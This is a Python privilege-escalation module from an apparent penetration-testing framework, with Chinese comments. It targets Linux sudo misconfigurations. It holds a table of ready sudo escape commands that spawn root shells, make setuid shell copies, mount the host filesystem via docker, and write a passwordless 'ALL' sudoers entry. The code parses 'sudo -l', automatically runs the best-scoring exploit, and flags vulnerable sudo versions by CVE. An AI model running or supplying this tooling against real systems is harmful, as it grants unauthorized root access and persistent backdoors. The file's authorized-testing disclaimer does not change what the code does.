#!/usr/bin/env python3
"""
Sudo 绕过模块 - Sudo Bypass Module
ATT&CK Technique: T1548.003 - Sudo and Sudo Caching

利用 sudo 配置错误进行提权
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List, Tuple
import logging
import subprocess
import re
import platform

from ..base import EscalationResult, EscalationMethod, PrivilegeLevel

logger = logging.getLogger(__name__)


@dataclass
class SudoEntry:
    """sudo 配置条目"""
    user: str = ''
    host: str = 'ALL'
    runas_user: str = 'root'
    runas_group: str = ''
    nopasswd: bool = False
    commands: List[str] = field(default_factory=list)
    raw_line: str = ''

    def to_dict(self) -> Dict[str, Any]:
        return {
            'user': self.user,
            'host': self.host,
            'runas_user': self.runas_user,
            'nopasswd': self.nopasswd,
            'commands': self.commands,
            'raw_line': self.raw_line,
        }


class SudoBypass:
    """
    Sudo 绕过模块

    分析和利用 sudo 配置错误

    Usage:
        bypass = SudoBypass()
        entries = bypass.parse_sudo_l()
        result = bypass.exploit()

    Warning: 仅限授权渗透测试使用！
    """

    # GTFOBins 风格的 sudo 利用方法
    SUDO_EXPLOITS: Dict[str, Tuple[str, float]] = {
        # 格式: command_pattern: (exploit_method, success_probability)
        '/bin/bash': ('sudo /bin/bash', 0.95),
        '/bin/sh': ('sudo /bin/sh', 0.95),
        '/usr/bin/bash': ('sudo /usr/bin/bash', 0.95),
        '/usr/bin/sh': ('sudo /usr/bin/sh', 0.95),

        'python': ("sudo python -c 'import os; os.system(\"/bin/sh\")'", 0.90),
        'python3': ("sudo python3 -c 'import os; os.system(\"/bin/sh\")'", 0.90),
        'perl': ("sudo perl -e 'exec \"/bin/sh\";'", 0.90),
        'ruby': ("sudo ruby -e 'exec \"/bin/sh\"'", 0.90),
        'lua': ("sudo lua -e 'os.execute(\"/bin/sh\")'", 0.85),
        'php': ("sudo php -r 'system(\"/bin/sh\");'", 0.85),

        'vim': ('sudo vim -c \':!/bin/sh\'', 0.90),
        'vi': ('sudo vi -c \':!/bin/sh\'', 0.90),
        'nano': ('sudo nano\n^R^X\nreset; sh 1>&0 2>&0', 0.75),

        'less': ('sudo less /etc/passwd\n!/bin/sh', 0.85),
        'more': ('sudo more /etc/passwd\n!/bin/sh', 0.85),
        'man': ('sudo man man\n!/bin/sh', 0.80),

        'find': ('sudo find / -exec /bin/sh \\; -quit', 0.90),
        'awk': ("sudo awk 'BEGIN {system(\"/bin/sh\")}'", 0.90),
        'sed': ("sudo sed -n '1e exec sh 1>&0' /etc/hosts", 0.80),

        'env': ('sudo env /bin/sh', 0.90),
        'ftp': ('sudo ftp\n!/bin/sh', 0.80),
        'nmap': ('sudo nmap --interactive\n!sh', 0.85),

        'tar': ('sudo tar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/sh', 0.80),
        'zip': ('TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT \'sh #\'', 0.75),

        'git': ('sudo git -p help config\n!/bin/sh', 0.80),
        'ssh': ('sudo ssh -o ProxyCommand=\';sh 0<&2 1>&2\' x', 0.75),

        'cp': ('sudo cp /bin/sh /tmp/sh_root; sudo chmod +s /tmp/sh_root; /tmp/sh_root -p', 0.85),
        'mv': ('LFILE=/tmp/sh_mv; sudo mv /bin/sh $LFILE; $LFILE -p', 0.75),

        'docker': ('sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh', 0.90),
        'lxc': ('sudo lxc-start', 0.85),

        'rvim': ('sudo rvim -c \':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")\'', 0.80),
        'ed': ('sudo ed\n!/bin/sh', 0.80),

        'screen': ('sudo screen', 0.75),
        'tmux': ('sudo tmux', 0.75),

        'strace': ('sudo strace -o /dev/null /bin/sh', 0.85),
        'ltrace': ('sudo ltrace -o /dev/null /bin/sh', 0.85),

        'tee': ('echo "user ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/pwn', 0.70),
        'dd': ('echo "user ALL=(ALL) NOPASSWD: ALL" | sudo dd of=/etc/sudoers.d/pwn', 0.70),

        'mysql': ("sudo mysql -e '\\! /bin/sh'", 0.80),
        'psql': ("sudo psql -c '\\! /bin/sh'", 0.80),

        'apache2': ('sudo apache2 -f /etc/shadow', 0.60),  # 仅读取敏感文件
        'nginx': ('sudo nginx -c /etc/shadow', 0.60),
    }

    def __init__(self):
        self.logger = logging.getLogger(f"{__name__}.SudoBypass")
        self._sudo_entries: List[SudoEntry] = []

    def parse_sudo_l(self, password: str = None) -> List[SudoEntry]:
        """
        解析 sudo -l 输出

        Args:
            password: 用户密码（如果需要）

        Returns:
            SudoEntry 列表
        """
        entries = []

        try:
            if password:
                # 通过 stdin 提供密码
                result = subprocess.run(
                    ['sudo', '-S', '-l'],
                    input=password + '\n',
                    capture_output=True,
                    text=True,
                    timeout=15
                )
            else:
                result = subprocess.run(
                    ['sudo', '-l'],
                    capture_output=True,
                    text=True,
                    timeout=15
                )

            if result.returncode != 0:
                self.logger.warning(f"sudo -l failed: {result.stderr}")
                return entries

            # 解析输出
            lines = result.stdout.strip().split('\n')

            for line in lines:
                entry = self._parse_sudo_line(line)
                if entry:
                    entries.append(entry)

        except subprocess.TimeoutExpired:
            self.logger.warning("sudo -l timed out (password may be required)")
        except Exception as e:
            self.logger.error(f"Failed to parse sudo -l: {e}")

        self._sudo_entries = entries
        return entries

    def _parse_sudo_line(self, line: str) -> Optional[SudoEntry]:
        """解析单行 sudo 配置"""
        line = line.strip()

        # 跳过非命令行
        if not line or line.startswith('User') or line.startswith('Matching'):
            return None

        entry = SudoEntry(raw_line=line)

        # 检查 NOPASSWD
        entry.nopasswd = 'NOPASSWD' in line

        # 提取运行身份
        runas_match = re.search(r'\(([^)]+)\)', line)
        if runas_match:
            runas = runas_match.group(1)
            if ':' in runas:
                entry.runas_user, entry.runas_group = runas.split(':', 1)
            else:
                entry.runas_user = runas

        # 提取命令
        # 移除 NOPASSWD: 等前缀
        cmd_part = re.sub(r'\([^)]+\)\s*', '', line)
        cmd_part = re.sub(r'NOPASSWD:\s*', '', cmd_part)
        cmd_part = re.sub(r'SETENV:\s*', '', cmd_part)

        commands = [c.strip() for c in cmd_part.split(',') if c.strip()]
        entry.commands = commands

        return entry if commands else None

    def get_exploitable_entries(self) -> List[Tuple[SudoEntry, str, float]]:
        """
        获取可利用的 sudo 条目

        Returns:
            (SudoEntry, exploit_command, probability) 元组列表
        """
        if not self._sudo_entries:
            self.parse_sudo_l()

        exploitable = []

        for entry in self._sudo_entries:
            for cmd in entry.commands:
                # 检查是否匹配已知可利用命令
                for pattern, (exploit, probability) in self.SUDO_EXPLOITS.items():
                    if pattern in cmd or cmd == 'ALL':
                        # 调整利用命令
                        if cmd != 'ALL':
                            exploit = exploit.replace(pattern, cmd)

                        exploitable.append((entry, exploit, probability))
                        break

        # 按概率排序
        exploitable.sort(key=lambda x: x[2], reverse=True)
        return exploitable

    def exploit(self, command: str = None) -> EscalationResult:
        """
        执行 sudo 提权

        Args:
            command: 指定利用命令，为 None 时自动选择

        Returns:
            EscalationResult
        """
        # 平台检测
        if platform.system() != 'Linux':
            return EscalationResult(
                success=False,
                method=EscalationMethod.SUDO,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error="Sudo bypass is only supported on Linux"
            )

        if command is None:
            exploitable = self.get_exploitable_entries()

            if not exploitable:
                return EscalationResult(
                    success=False,
                    method=EscalationMethod.SUDO,
                    from_level=PrivilegeLevel.LOW,
                    to_level=PrivilegeLevel.LOW,
                    error="No exploitable sudo entries found"
                )

            # 优先使用 NOPASSWD 条目
            nopasswd_entries = [e for e in exploitable if e[0].nopasswd]
            if nopasswd_entries:
                entry, command, probability = nopasswd_entries[0]
            else:
                entry, command, probability = exploitable[0]

        self.logger.info(f"Attempting sudo exploit: {command}")

        try:
            # 执行利用
            result = subprocess.run(
                ['sh', '-c', command],
                capture_output=True,
                text=True,
                timeout=10
            )

            # 验证
            whoami_result = subprocess.run(
                ['whoami'],
                capture_output=True,
                text=True,
                timeout=5
            )

            if whoami_result.stdout.strip() == 'root':
                return EscalationResult(
                    success=True,
                    method=EscalationMethod.SUDO,
                    from_level=PrivilegeLevel.LOW,
                    to_level=PrivilegeLevel.SYSTEM,
                    output=f"Sudo exploit successful",
                    evidence=f"Command: {command}"
                )

            return EscalationResult(
                success=False,
                method=EscalationMethod.SUDO,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error="Exploit executed but privilege not elevated"
            )

        except subprocess.TimeoutExpired:
            # 超时可能意味着获得了交互式 shell
            return EscalationResult(
                success=True,
                method=EscalationMethod.SUDO,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.SYSTEM,
                output=f"Exploit may have succeeded (interactive shell)",
                evidence=f"Command: {command}"
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.SUDO,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error=str(e)
            )

    def check_sudo_version(self) -> Dict[str, Any]:
        """检查 sudo 版本是否存在已知漏洞"""
        vulnerabilities = []

        try:
            result = subprocess.run(
                ['sudo', '-V'],
                capture_output=True,
                text=True,
                timeout=10
            )

            version_match = re.search(r'Sudo version (\d+\.\d+\.?\d*)', result.stdout)
            if version_match:
                version = version_match.group(1)

                # 已知漏洞版本检查
                known_vulns = {
                    # (版本范围, CVE, 描述)
                    ('1.8.0', '1.8.31'): ('CVE-2019-14287', 'User ID -1 bypass'),
                    ('1.8.2', '1.8.31p2'): ('CVE-2021-3156', 'Heap overflow (Baron Samedit)'),
                }

                for version_range, vuln_info in known_vulns.items():
                    min_ver, max_ver = version_range
                    if self._version_in_range(version, min_ver, max_ver):
                        vulnerabilities.append({
                            'cve': vuln_info[0],
                            'description': vuln_info[1],
                            'version': version,
                        })

                return {
                    'version': version,
                    'vulnerabilities': vulnerabilities,
                    'vulnerable': len(vulnerabilities) > 0,
                }

        except Exception as e:
            self.logger.error(f"Failed to check sudo version: {e}")

        return {
            'version': 'unknown',
            'vulnerabilities': [],
            'vulnerable': False,
        }

    def _version_in_range(self, version: str, min_ver: str, max_ver: str) -> bool:
        """检查版本是否在范围内"""
        try:
            def parse_version(v):
                parts = v.replace('p', '.').split('.')
                return [int(p) for p in parts if p.isdigit()]

            v = parse_version(version)
            min_v = parse_version(min_ver)
            max_v = parse_version(max_ver)

            return min_v <= v <= max_v

        except ValueError:
            return False


__all__ = ['SudoBypass', 'SudoEntry']
